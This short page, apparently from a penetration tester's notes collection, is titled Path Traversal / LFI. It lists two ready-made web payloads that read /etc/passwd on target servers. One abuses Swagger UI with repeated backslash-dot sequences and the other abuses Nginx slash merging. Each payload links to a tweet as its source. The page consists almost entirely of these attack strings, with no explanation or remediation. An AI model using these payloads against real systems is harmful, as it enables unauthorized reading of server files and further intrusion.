---
description: Path Traversal and Local File Inclusion Vulnerabilities
---

# Path Traversal / LFI

### Collection

{% code overflow="wrap" %}
```
/v1/docs//..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd
/endpoint///////../../../../../../../etc/passwd
```
{% endcode %}

#### [Swagger UI LFI Injection](https://twitter.com/0x0SojalSec/status/1569218639748026368)

{% code overflow="wrap" %}
```
/v1/docs//..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd
```
{% endcode %}

#### [Nginx merge slashes path traversal](https://twitter.com/0xmahmoudJo0/status/1568976790546169856)

```
/endpoint///////../../../../../../../etc/passwd
```